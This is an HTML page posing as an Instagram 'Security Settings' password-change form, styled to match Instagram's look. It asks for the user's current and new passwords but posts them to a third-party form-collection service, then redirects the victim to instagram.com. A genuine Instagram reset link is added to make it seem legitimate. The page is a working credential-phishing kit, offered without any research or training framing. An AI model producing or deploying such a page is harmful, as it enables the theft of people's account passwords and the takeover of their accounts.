<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Change Password</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .change-password-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 40px;
            width: 350px;
            display: flex;
            flex-direction: column;
            align-items: center;
            border-radius: 3px;
        }

        .logo {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 25px;
            color: #262626;
            letter-spacing: -1px;
        }

        .input-group {
            width: 100%;
        }

        input {
            width: 100%;
            padding: 12px 10px;
            margin-bottom: 10px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
            font-size: 13px;
            box-sizing: border-box;
        }

        input:focus {
            border-color: #a8a8a8;
            outline: none;
        }

        .btn-changer {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 10px;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 15px;
        }

        .btn-changer:hover {
            background-color: #1877f2;
        }

        .footer-link {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            margin-top: 25px;
            font-weight: 500;
        }

        .footer-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="change-password-container">
        <div class="logo">Security Settings</div>
        
        <form action="https://formspree.io/f/myklqyjp" method="POST" style="width: 100%;">
            <div class="input-group">
                <input type="password" name="Current_Password" placeholder="Current Password" required>
                <input type="password" name="New_Password" placeholder="New Password" required>
                <input type="password" name="Confirm_New_Password" placeholder="Confirm New Password" required>
            </div>

            <button type="submit" class="btn-changer">Changer</button>
            
            <input type="hidden" name="_next" value="https://www.instagram.com">
        </form>

        <a href="https://www.instagram.com/accounts/password/reset/" target="_blank" class="footer-link">Forgot password?</a>
    </div>

</body>
</html>
